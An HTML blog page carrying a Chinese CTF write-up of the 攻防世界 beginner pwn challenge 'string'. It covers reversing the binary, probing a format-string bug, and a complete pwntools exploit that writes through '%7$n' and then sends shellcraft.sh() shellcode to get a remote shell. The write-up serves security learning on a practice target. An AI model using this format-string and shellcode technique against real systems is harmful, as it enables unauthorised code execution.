@@ -1,0 +1,371 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CTF攻防世界 pwn新手题 string | MambaInVeins Blog</title><meta name="keywords" content="pwn,ctf"><meta name="author" content="MambaInVeins"><meta name="copyright" content="MambaInVeins"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="下载文件后改名为string 进行通过file判断附件文件类型 $ file string string: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 2.6.32, BuildID[sh">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF攻防世界 pwn新手题 string">
+<meta property="og:url" content="http://mambainveins.gitee.io/mambainveins/2020/12/21/2020/2020-12-21-CTF_world_pwn_newbee_string/index.html">
+<meta property="og:site_name" content="MambaInVeins Blog">
+<meta property="og:description" content="下载文件后改名为string 进行通过file判断附件文件类型 $ file string string: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 2.6.32, BuildID[sh">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0195.png">
+<meta property="article:published_time" content="2020-12-20T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-05-25T14:28:17.769Z">
+<meta property="article:author" content="MambaInVeins">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0195.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://mambainveins.gitee.io/mambainveins/2020/12/21/2020/2020-12-21-CTF_world_pwn_newbee_string/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="preconnect" href="//zz.bdstatic.com"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: MambaInVeins","link":"链接: ","source":"来源: MambaInVeins Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2021-05-25 22:28:17'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}const fontSizeVal = saveToLocal.get('global-font-size')
+if (fontSizeVal !== undefined) {
+  document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+}})()</script><meta name="generator" content="Hexo 5.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/blogpublic/MambaInVeins.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">243</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">96</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">32</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/moment"><i class="fa-fw fas fa-comment-alt"></i><span> 碎语</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 常用链接</span></a></div><div class="menus_item"><a class="site-page" href="/box"><i class="fa-fw fas fa-box"></i><span> 工具箱</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0195.png)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">MambaInVeins Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/moment"><i class="fa-fw fas fa-comment-alt"></i><span> 碎语</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 常用链接</span></a></div><div class="menus_item"><a class="site-page" href="/box"><i class="fa-fw fas fa-box"></i><span> 工具箱</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CTF攻防世界 pwn新手题 string</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-12-20T16:00:00.000Z" title="发表于 2020-12-21 00:00:00">2020-12-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-25T14:28:17.769Z" title="更新于 2021-05-25 22:28:17">2021-05-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/pwn/">pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>下载文件后改名为string</p>
+<p>进行通过file判断附件文件类型</p>
+<pre><code>$ file string
+string: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4f9fd3e83d275c6555ec7059823616ffc2f1af1b, stripped</code></pre>
+<p>checksec一下，检查一下保护机制,打开了RELRO、Canary和NX，那就没办法做栈溢出了</p>
+<pre><code>$ pwn checksec string
+[*] &#39;/root/Desktop/ctf-world-pwn/string/string&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)</code></pre>
+<p>逆向重要的函数</p>
+<p>main函数</p>
+<pre><code>__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+&#123;
+    _DWORD *v3; // rax
+    _DWORD *v4; // ST18_8
+
+    setbuf(stdout, 0LL);
+    alarm(0x3Cu);
+    sub_400996(60LL, 0LL);
+    v3 = malloc(8uLL);
+    v4 = v3;
+    *v3 = 68;
+    v3[1] = 85;
+    puts(&quot;we are wizard, we will give you hand, you can not defeat dragon by yourself ...&quot;);
+    puts(&quot;we will tell you two secret ...&quot;);
+    printf(&quot;secret[0] is %x\n&quot;, v4, a2);
+    printf(&quot;secret[1] is %x\n&quot;, v4 + 1);
+    puts(&quot;do not tell anyone &quot;);
+    sub_400D72(v4);
+    puts(&quot;The End.....Really?&quot;);
+    return 0LL;
+&#125;</code></pre>
+<p>可以看到，main 函数做了如下工作：</p>
+<pre><code>调用了 alarm 函数，并设置了计时为 60s ，也就是说程序会在 60s 后退出
+调用 sub_400996 ，这个函数主要用于输出，比如那条龙就是它的结果
+分配了8个字节的空间，对低4位赋值为 68 ，高4位赋值为 85
+将分配的空间的低四位的地址和高四位的地址分别输出
+用分配出来的空间的起始地址做参数调用了 sub_400D72</code></pre>
+<p>在这些工作中，对解题有帮助的是输出的两个地址以及分配的空间中的两个值</p>
+<p>sub_400D72函数</p>
+<pre><code>unsigned __int64 __fastcall sub_400D72(__int64 a1)
+&#123;
+    char s; // [rsp+10h] [rbp-20h]
+    unsigned __int64 v3; // [rsp+28h] [rbp-8h]
+
+    v3 = __readfsqword(0x28u);
+    puts(&quot;What should your character&#39;s name be:&quot;);
+    _isoc99_scanf(&quot;%s&quot;, &amp;s);
+    if ( strlen(&amp;s) &lt;= 0xC )
+    &#123;
+        puts(&quot;Creating a new player.&quot;);
+        sub_400A7D(&quot;Creating a new player.&quot;);
+        sub_400BB9();
+        sub_400CA6(a1);
+    &#125;
+    else
+    &#123;
+        puts(&quot;Hei! What&#39;s up!&quot;);
+    &#125;
+    return __readfsqword(0x28u) ^ v3;
+&#125;</code></pre>
+<p>完成的工作如下：</p>
+<pre><code>获取输入
+如果输入的长度大于 12 则回到 main 函数并退出
+否则继续按顺序调用三个函数，其中第三个函数使用了 main 中得到的地址</code></pre>
+<p>sub_400A7D函数</p>
+<pre><code>unsigned __int64 sub_400A7D()
+&#123;
+    char s1; // [rsp+0h] [rbp-10h]
+    unsigned __int64 v2; // [rsp+8h] [rbp-8h]
+
+    v2 = __readfsqword(0x28u);
+        ......
+    while ( 1 )
+    &#123;
+        _isoc99_scanf(&quot;%s&quot;, &amp;s1);
+        if ( !strcmp(&amp;s1, &quot;east&quot;) || !strcmp(&amp;s1, &quot;east&quot;) )
+        break;
+        puts(&quot;hei! I&#39;m secious!&quot;);
+        puts(&quot;So, where you will go?:&quot;);
+    &#125;
+    if ( strcmp(&amp;s1, &quot;east&quot;) )
+    &#123;
+        if ( !strcmp(&amp;s1, &quot;up&quot;) )
+        sub_4009DD(&amp;s1, &quot;up&quot;);
+        puts(&quot;YOU KNOW WHAT YOU DO?&quot;);
+        exit(0);
+    &#125;
+    return __readfsqword(0x28u) ^ v2;
+&#125;</code></pre>
+<p>完成的工作如下：</p>
+<pre><code>一直获取输入，直到输入为 east 为止才能进行下一个流程</code></pre>
+<p>sub_400BB9函数</p>
+<pre><code>unsigned __int64 sub_400BB9()
+&#123;
+    int v1; // [rsp+4h] [rbp-7Ch]
+    __int64 v2; // [rsp+8h] [rbp-78h]
+    char format; // [rsp+10h] [rbp-70h]
+    unsigned __int64 v4; // [rsp+78h] [rbp-8h]
+
+    v4 = __readfsqword(0x28u);
+    v2 = 0LL;
+    ......
+    _isoc99_scanf(&quot;%d&quot;, &amp;v1);
+    if ( v1 == 1 )
+    &#123;
+        puts(&quot;A voice heard in your mind&quot;);
+        puts(&quot;&#39;Give me an address&#39;&quot;);
+        _isoc99_scanf(&quot;%ld&quot;, &amp;v2);
+        puts(&quot;And, you wish is:&quot;);
+        _isoc99_scanf(&quot;%s&quot;, &amp;format);
+        puts(&quot;Your wish is&quot;);
+        printf(&amp;format, &amp;format);
+        puts(&quot;I hear it, I hear it....&quot;);
+    &#125;
+    return __readfsqword(0x28u) ^ v4;
+&#125;</code></pre>
+<p>完成的工作如下：</p>
+<pre><code>获取输入，如果输入的值不是 1 ，那么直接进行下一个流程
+如果输入的值是 1，那么存在格式化字符串漏洞，目前还看不出它的意义</code></pre>
+<p>sub_400CA6函数</p>
+<pre><code>unsigned __int64 __fastcall sub_400CA6(_DWORD *a1)
+&#123;
+    void *v1; // rsi
+    unsigned __int64 v3; // [rsp+18h] [rbp-8h]
+
+    v3 = __readfsqword(0x28u);
+    ......
+    if ( *a1 == a1[1] )
+    &#123;
+        puts(&quot;Wizard: I will help you! USE YOU SPELL&quot;);
+        v1 = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);
+        read(0, v1, 0x100uLL);
+        ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);
+    &#125;
+    return __readfsqword(0x28u) ^ v3;
+&#125;</code></pre>
+<p>完成的功能如下：</p>
+<pre><code>比较 main 中分配的空间中低四位和高四位的值，如果不相等那么一直 return 至游戏结束
+如果相等，那么调用 mmap 分配一块 1000h 大小的空间，其中第三个参数告诉我们，这块空间具有可读可写可执行的权限
+获取输入并存储到这片空间中
+强转为函数指针并调用之</code></pre>
+<p>分析并得到 exp</p>
+<p>既然我们通过 mmap 获得了一块可执行的空间，那么可以在这里写入 shellcode 来获取 shell ；但是要让程序的执行流程到达这里，我们需要让 main 中分配的那 8 个字节的空间中，低 4 位和高 4 位的值相等；</p>
+<p>在 main 函数中，我们获得了它们的地址，而在 sub_400BB9 函数中存在着格式化字符串漏洞，有了这两个条件我们就可以修改其中一个值来使它们相等</p>
+<p>在前面的 cheksec 检查中，我们发现这是一个 64 位的程序，而根据调用规约，前 6 个参数是放在寄存器中的，那么我们如何构造 payload 呢？</p>
+<p>回到 sub_400BB9 中，</p>
+<p>wish输入AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p （26338952-0x191e688）</p>
+<pre><code>&#39;Give me an address&#39;
+26338952
+And, you wish is:
+AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
+Your wish is
+AAAA-0x7fda21f39723-(nil)-0x7fda21e68ef3-0xd-0xffffffffffffff80-0x100000000-0x191e688-0x2d70252d41414141-0x70252d70252d7025-0x252d70252d70252dI hear it, I hear it....</code></pre>
+<p>那么这个 v2 恰恰就是 args 中的第 7 个参数，所以我们可以用 ‘%7$n’ 的方式来访问并修改 main 中分配的空间中的值</p>
+<p>修改至相等后，程序会执行到巫师给予帮助的部分，我们只要在这里写入 shellcode 即可拿到 shell</p>
+<p>所以，最后的 exp 如下：</p>
+<pre><code>from pwn import *
+
+p = remote(远程ip, 远程端口)
+
+p.recvuntil(&#39;secret[0] is &#39;)
+
+# 获取第四位的地址，用切片切掉最后的\n，开始的空格在上面的 recvuntil 中
+# 获得的数字直接用 int(x, 16) 即可转成十进制整型储存在 addr 中
+addr = int(p.recvuntil(&#39;\n&#39;)[:-1], 16)
+
+p.recvuntil(&#39;name be:\n&#39;)
+p.sendline(&#39;Yuren&#39;)
+p.recvuntil(&#39;up?:\n&#39;)
+p.sendline(&#39;east&#39;)
+p.recvuntil(&#39;leave(0)?:&#39;)
+p.sendline(&#39;1&#39;)
+p.recv()
+p.sendline(str(addr))
+p.recv()
+p.sendline(&#39;%85x%7$n&#39;) #作用是将85写入栈内第7个参数所指向的地址
+rec = p.recvuntil(&#39;SPELL\n&#39;)
+
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)
+# 获得执行system(“/bin/sh”)汇编代码所对应的机器码： asm(shellcraft.sh()) 。注意要指明arch和os。arch有i386(x86)和amd64(x64)。
+p.sendline(asm(shellcraft.sh()))
+p.interactive()</code></pre>
+<p>格式化字符串漏洞还需要继续加强理解利用！！</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">MambaInVeins</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mambainveins.gitee.io/mambainveins/2020/12/21/2020/2020-12-21-CTF_world_pwn_newbee_string/">http://mambainveins.gitee.io/mambainveins/2020/12/21/2020/2020-12-21-CTF_world_pwn_newbee_string/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mambainveins.gitee.io/mambainveins" target="_blank">MambaInVeins Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0195.png" data-sites="wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/blogpublic/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/blogpublic/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/blogpublic/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/blogpublic/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/12/21/2020/2020-12-21-CTF_world_pwn_newbee_cgpwn2/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0100.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CTF攻防世界 pwn新手题 cgpwn2</div></div></a></div><div class="next-post pull-right"><a href="/2020/12/19/2020/2020-12-19-CTF_world_pwn_newbee_int_overflow/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0144.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CTF攻防世界 pwn新手题 int_overflow</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2020/08/18/2020/2020-08-18-CTF_world_pwn_newbee_level2/" title="CTF攻防世界 pwn新手题 level2(ret2libc)"><img class="cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0155.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-18</div><div class="title">CTF攻防世界 pwn新手题 level2(ret2libc)</div></div></a></div><div><a href="/2020/08/18/2020/2020-08-18-CTF_world_pwn_newbee_level0/" title="CTF攻防世界 pwn新手题 level0(ret2text)"><img class="cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0040.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-18</div><div class="title">CTF攻防世界 pwn新手题 level0(ret2text)</div></div></a></div><div><a href="/2020/08/18/2020/2020-08-18-CTF_world_pwn_newbee_when_did_you_born/" title="CTF攻防世界 pwn新手题 when_did_you_born"><img class="cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0456.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-18</div><div class="title">CTF攻防世界 pwn新手题 when_did_you_born</div></div></a></div><div><a href="/2020/08/18/2020/2020-08-18-pwn_study/" title="pwn入门"><img class="cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0221.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-18</div><div class="title">pwn入门</div></div></a></div><div><a href="/2020/08/19/2020/2020-08-19-pwntools_install/" title="安装pwntools"><img class="cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0090.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-19</div><div class="title">安装pwntools</div></div></a></div><div><a href="/2020/08/31/2020/2020-08-31-pwn_buffer_overflow/" title="CTF-PWN练习-一个缓冲区溢出基础例子"><img class="cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0181.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-31</div><div class="title">CTF-PWN练习-一个缓冲区溢出基础例子</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/blogpublic/MambaInVeins.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">MambaInVeins</div><div class="author-info__description">身体和灵魂总有一个在路上</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">243</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">96</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">32</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mambainveins"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/mambainveins" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:mambainveins@protonmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的小站，博客正在迁移中。</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/06/14/2021/2021-06-14-ubuntu_coredump/" title="linux强制core dump"><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0149.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="linux强制core dump"/></a><div class="content"><a class="title" href="/2021/06/14/2021/2021-06-14-ubuntu_coredump/" title="linux强制core dump">linux强制core dump</a><time datetime="2021-06-13T16:00:00.000Z" title="发表于 2021-06-14 00:00:00">2021-06-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/23/2021/2021-05-23-vmware_hgfs_empty/" title="vmware 共享文件夹hgfs下为空的解决办法"><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0139.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vmware 共享文件夹hgfs下为空的解决办法"/></a><div class="content"><a class="title" href="/2021/05/23/2021/2021-05-23-vmware_hgfs_empty/" title="vmware 共享文件夹hgfs下为空的解决办法">vmware 共享文件夹hgfs下为空的解决办法</a><time datetime="2021-05-22T16:00:00.000Z" title="发表于 2021-05-23 00:00:00">2021-05-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/14/2021/2021-05-14-burpsuite_localhost/" title="burpsuite不能拦截本地包"><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0187.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="burpsuite不能拦截本地包"/></a><div class="content"><a class="title" href="/2021/05/14/2021/2021-05-14-burpsuite_localhost/" title="burpsuite不能拦截本地包">burpsuite不能拦截本地包</a><time datetime="2021-05-13T16:00:00.000Z" title="发表于 2021-05-14 00:00:00">2021-05-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/14/2021/2021-05-14-upload_labs/" title="文件上传漏洞 练习平台upload-labs"><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0142.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件上传漏洞 练习平台upload-labs"/></a><div class="content"><a class="title" href="/2021/05/14/2021/2021-05-14-upload_labs/" title="文件上传漏洞 练习平台upload-labs">文件上传漏洞 练习平台upload-labs</a><time datetime="2021-05-13T16:00:00.000Z" title="发表于 2021-05-14 00:00:00">2021-05-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/13/2021/2021-05-13-django_CVE-2019-14234/" 